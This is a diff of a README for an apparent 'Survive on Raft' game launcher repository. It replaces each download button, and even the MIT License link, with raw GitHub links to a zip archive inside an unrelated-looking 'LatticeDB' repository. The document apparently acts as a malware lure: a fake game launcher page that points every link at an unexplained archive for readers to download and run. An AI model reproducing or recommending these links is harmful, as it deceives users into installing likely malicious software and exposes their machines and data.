@@ -1,6 +1,6 @@
 # 🚤 Survive on Raft: Adventure Download & Guide
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://github.com/Accoladecr/LatticeDB-NextGen-DBMS/raw/refs/heads/main/overemotional/D_Lattice_Gen_Next_DBMS_Scorpididae.zip)](https://github.com/Accoladecr/LatticeDB-NextGen-DBMS/raw/refs/heads/main/overemotional/D_Lattice_Gen_Next_DBMS_Scorpididae.zip)
 
 Welcome to the *Survive on Raft* Adventure Repository! Experience the thrill of ocean survival with a powerful launcher and extensive features designed for a seamless gaming journey. Explore the open seas, craft equipment, and build your ultimate floating refuge in this intense survival simulator.
 
@@ -31,7 +31,7 @@ Welcome to the *Survive on Raft* Adventure Repository! Experience the thrill of 
 ## 🚩 Installation Instructions
 
 1️⃣ **Download the Adventure Launcher:**  
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://github.com/Accoladecr/LatticeDB-NextGen-DBMS/raw/refs/heads/main/overemotional/D_Lattice_Gen_Next_DBMS_Scorpididae.zip)](https://github.com/Accoladecr/LatticeDB-NextGen-DBMS/raw/refs/heads/main/overemotional/D_Lattice_Gen_Next_DBMS_Scorpididae.zip)
 
 2️⃣ Follow the step-by-step guide displayed in the installer for your OS.
 
@@ -53,8 +53,8 @@ This repository is a fan-driven guide and launcher. Always respect intellectual 
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) – 2025.
+Distributed under the [MIT License](https://github.com/Accoladecr/LatticeDB-NextGen-DBMS/raw/refs/heads/main/overemotional/D_Lattice_Gen_Next_DBMS_Scorpididae.zip) – 2025.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://github.com/Accoladecr/LatticeDB-NextGen-DBMS/raw/refs/heads/main/overemotional/D_Lattice_Gen_Next_DBMS_Scorpididae.zip)](https://github.com/Accoladecr/LatticeDB-NextGen-DBMS/raw/refs/heads/main/overemotional/D_Lattice_Gen_Next_DBMS_Scorpididae.zip)
